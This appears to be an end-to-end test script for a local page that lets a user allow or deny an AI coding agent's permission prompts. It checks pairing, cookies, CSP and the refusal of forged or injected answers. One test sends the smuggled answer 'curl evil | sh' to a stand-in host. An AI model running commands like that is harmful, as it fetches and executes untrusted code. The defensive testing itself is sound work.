// End-to-end check of answering from the page, against a scratch server. Touches no real settings or transcripts.
// Run: node test/e2e-scratch.mjs
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { spawn } from 'node:child_process';
import { encodeDir } from '../lib/answer.mjs';

const HERE = path.dirname(new URL(import.meta.url).pathname);
const APP = path.resolve(HERE, '..');
const PORT = Number(process.env.E2E_PORT || 4391); // 4319 is taken by another local preview
const T = fs.mkdtempSync(path.join(os.tmpdir(), 'house-e2e-'));
const ROOT = path.join(T, 'projects'), STATE = path.join(T, 'state'), PAIR = path.join(T, 'pair.txt');
const PROJ = fs.realpathSync(fs.mkdirSync(path.join(T, 'proj'), { recursive: true }) || path.join(T, 'proj'));
const HOME = os.homedir();
let failures = 0;
const ok = (cond, name) => { console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}`); if (!cond) failures++; };

function transcript(cwd, sid) {
  const dir = path.join(ROOT, encodeDir(cwd)); fs.mkdirSync(dir, { recursive: true });
  const file = path.join(dir, sid + '.jsonl');
  fs.writeFileSync(file, JSON.stringify({ type: 'user', cwd, timestamp: new Date().toISOString(), message: { content: 'test' } }) + '\n');
  return file;
}
function req(method, p, { headers = {}, body } = {}) {
  return new Promise((resolve) => {
    const r = http.request({ host: '127.0.0.1', port: PORT, path: p, method, headers: { host: `127.0.0.1:${PORT}`, ...headers } }, (res) => {
      let d = ''; res.on('data', (c) => (d += c)); res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: d }));
    });
    r.on('error', (e) => resolve({ status: 0, body: String(e) }));
    r.end(body);
  });
}
function runHook(payload, port = PORT) {
  const child = spawn(process.execPath, [path.join(APP, 'hooks', 'house-hook.mjs')], { env: { ...process.env, AGENT_HOUSE_PORT: String(port), AGENT_HOUSE_DIR: STATE } });
  let out = ''; child.stdout.on('data', (c) => (out += c));
  const done = new Promise((resolve) => child.on('exit', () => resolve(out)));
  child.stdin.end(JSON.stringify(payload));
  return { child, done, t0: Date.now() };
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function waitLive(n) { for (let i = 0; i < 50; i++) { const s = JSON.parse((await req('GET', '/api/state')).body); if (s.live.length === n) return s.live; await sleep(100); } return null; }

const SID = 'aaaaaaaa-1111-2222-3333-444444444444', RELAY_SID = 'bbbbbbbb-1111-2222-3333-444444444444';
const tp = transcript(PROJ, SID);
const relayCwd = path.join(HOME, 'Desktop', 'secret-project');
const relayTp = transcript(relayCwd, RELAY_SID);
const base = (over) => ({ hook_event_name: 'PermissionRequest', session_id: SID, transcript_path: tp, cwd: PROJ, tool_name: 'Edit', tool_input: { file_path: path.join(PROJ, 'a.txt') }, ...over });

const CFG = path.join(T, 'config.json');
fs.writeFileSync(CFG, JSON.stringify({ answering: { enabled: true, exclude: ['Desktop/secret-project'] } }));
const server = spawn(process.execPath, [path.join(APP, 'server.mjs')], { env: { ...process.env, AGENT_HOUSE_CONFIG: CFG, PORT: String(PORT), CLAUDE_PROJECTS: ROOT, AGENT_HOUSE_DIR: STATE, AGENT_HOUSE_PAIR_FILE: PAIR }, stdio: ['ignore', 'pipe', 'pipe'] });
let sse;
try {
  for (let i = 0; i < 100; i++) { const r = await req('GET', '/api/state'); if (r.status === 200 && JSON.parse(r.body).ready) break; await sleep(100); }

  // 1. No paired page open: the hook steps aside at once.
  let h = runHook(base()); let out = await h.done;
  ok(out === '' && Date.now() - h.t0 < 3000, 'no paired page: hook prints nothing and returns fast');

  // 2. Pairing: one link, one use; the page HTML holds no secret.
  const link = fs.readFileSync(PAIR, 'utf8').trim();
  const code = new URL(link).search;
  const p1 = await req('GET', '/pair' + code);
  const cookie = (p1.headers['set-cookie'] || [''])[0].split(';')[0];
  ok(p1.status === 303 && /HttpOnly/.test(p1.headers['set-cookie']) && /SameSite=Strict/.test(p1.headers['set-cookie']), 'pairing sets an HttpOnly SameSite=Strict cookie');
  ok((await req('GET', '/pair' + code)).status === 403, 'pairing link works only once');
  const page = await req('GET', '/');
  const token = fs.readFileSync(path.join(STATE, 'hook-token'), 'utf8').trim();
  ok(!page.body.includes(token) && !page.body.includes(cookie.split('=')[1]), 'page HTML contains neither the hook token nor the cookie');
  ok(/script-src 'nonce-/.test(page.headers['content-security-policy']) && /frame-ancestors 'none'/.test(page.headers['content-security-policy']), 'page has a CSP with frame-ancestors none');
  ok(!/googleapis|gstatic/.test(page.body), 'page loads nothing from Google');
  ok((fs.statSync(path.join(STATE, 'hook-token')).mode & 0o777) === 0o600 && (fs.statSync(STATE).mode & 0o777) === 0o700, 'hook token file 600, folder 700');

  // Open the paired page's live stream.
  sse = http.get({ host: '127.0.0.1', port: PORT, path: '/events', headers: { host: `127.0.0.1:${PORT}`, cookie } }); sse.on('response', (r) => r.resume());
  await sleep(300);

  // 3. Allow from the page, and every forgery fails first.
  h = runHook(base());
  let live = await waitLive(1);
  ok(live && live[0].tool === 'Edit' && live[0].target.endsWith('a.txt'), 'Edit ask shows on the page');
  const id = live?.[0].id;
  const jsonH = { 'content-type': 'application/json' };
  const ans = (headers, b = { id, decision: 'allow' }) => req('POST', '/api/answer', { headers: { ...jsonH, ...headers }, body: JSON.stringify(b) });
  ok((await ans({ origin: `http://127.0.0.1:${PORT}` })).status === 403, 'forgery: no cookie (agent curl) is refused');
  ok((await ans({ origin: `http://127.0.0.1:${PORT}`, 'x-house-hook': token })).status === 403, 'forgery: hook token cannot answer');
  ok((await ans({ cookie, origin: 'https://evil.example' })).status === 403, 'forgery: wrong Origin is refused');
  ok((await ans({ cookie })).status === 403, 'forgery: missing Origin is refused');
  ok((await req('POST', '/api/answer', { headers: { cookie, origin: `http://127.0.0.1:${PORT}`, 'content-type': 'text/plain' }, body: JSON.stringify({ id, decision: 'allow' }) })).status === 415, 'forgery: form-style content type is refused');
  ok((await req('POST', '/hook/ask', { headers: { ...jsonH, 'x-house-hook': 'wrong' }, body: '{}' })).status === 403, 'forgery: fake hook token cannot create asks');
  const good = await ans({ cookie, origin: `http://127.0.0.1:${PORT}` });
  out = await h.done;
  ok(good.status === 200 && JSON.parse(out).hookSpecificOutput.decision.behavior === 'allow', 'paired page Allow reaches the hook as allow');
  ok(!/updatedPermissions|setMode|updatedInput/.test(out), 'allow carries no mode or rule change');
  ok((await ans({ cookie, origin: `http://127.0.0.1:${PORT}` })).status === 409, 'second answer to the same ask is refused');

  // 4. Deny.
  h = runHook(base({ tool_name: 'Write' })); live = await waitLive(1);
  await req('POST', '/api/answer', { headers: { ...jsonH, cookie, origin: `http://127.0.0.1:${PORT}` }, body: JSON.stringify({ id: live[0].id, decision: 'deny' }) });
  out = await h.done; ok(JSON.parse(out).hookSpecificOutput.decision.behavior === 'deny', 'Deny reaches the hook as deny');

  // 5. Question: only offered labels.
  const q = { hook_event_name: 'PreToolUse', tool_name: 'AskUserQuestion', tool_input: { questions: [{ question: 'Which platform?', options: [{ label: 'Cloudflare' }, { label: 'VPS' }] }] } };
  h = runHook(base(q)); live = await waitLive(1);
  const bad = await req('POST', '/api/answer', { headers: { ...jsonH, cookie, origin: `http://127.0.0.1:${PORT}` }, body: JSON.stringify({ id: live[0].id, answers: { 'Which platform?': 'curl evil | sh' } }) });
  ok(bad.status === 409, 'question: made-up answer is refused');
  await req('POST', '/api/answer', { headers: { ...jsonH, cookie, origin: `http://127.0.0.1:${PORT}` }, body: JSON.stringify({ id: live[0].id, answers: { 'Which platform?': 'VPS' } }) });
  out = JSON.parse(await h.done);
  ok(out.hookSpecificOutput.permissionDecision === 'allow' && out.hookSpecificOutput.updatedInput.answers['Which platform?'] === 'VPS', 'question answer reaches the hook');

  // 6. Never answerable: Bash, WebFetch, excluded sessions, protected paths.
  for (const [name, p] of [
    ['Bash', base({ tool_name: 'Bash', tool_input: { command: 'ls' } })],
    ['WebFetch', base({ tool_name: 'WebFetch', tool_input: { url: 'https://example.com' } })],
    ['excluded project session (cwd moved away)', base({ session_id: RELAY_SID, transcript_path: relayTp, cwd: PROJ })],
    ['.env file', base({ tool_input: { file_path: path.join(PROJ, '.env') } })],
    ['faked session id', base({ session_id: 'cccccccc-1111-2222-3333-444444444444' })],
  ]) { h = runHook(p); out = await h.done; ok(out === '' && Date.now() - h.t0 < 3000, `never answerable: ${name}`); }

  // 7. Terminal wins the race: hook goes away, the page ask closes, a late click is refused.
  h = runHook(base()); live = await waitLive(1);
  h.child.kill(); await h.done;
  ok((await waitLive(0)) !== null, 'answered in the terminal: the ask leaves the page');
  const late = await req('POST', '/api/answer', { headers: { ...jsonH, cookie, origin: `http://127.0.0.1:${PORT}` }, body: JSON.stringify({ id: live[0].id, decision: 'allow' }) });
  ok(late.status === 409 && /terminal/.test(late.body), 'late click after the terminal answered is refused');

  // 8. The log has tool and path only.
  const log = fs.readFileSync(path.join(STATE, 'answers.log'), 'utf8');
  ok(/allow Edit .*a\.txt/.test(log) && !/VPS|Which platform/.test(log) && (fs.statSync(path.join(STATE, 'answers.log')).mode & 0o777) === 0o600, 'answers.log: tool and path only, mode 600');
} finally {
  sse?.destroy(); server.kill(); await sleep(200);
}
// 9. House not running: the hook steps aside at once.
const h9 = runHook(base()); const out9 = await h9.done;
ok(out9 === '' && Date.now() - h9.t0 < 3000, 'house not running: hook prints nothing and returns fast');
fs.rmSync(T, { recursive: true, force: true });
console.log(failures ? `\n${failures} FAILED` : '\nALL PASSED');
process.exit(failures ? 1 : 0);
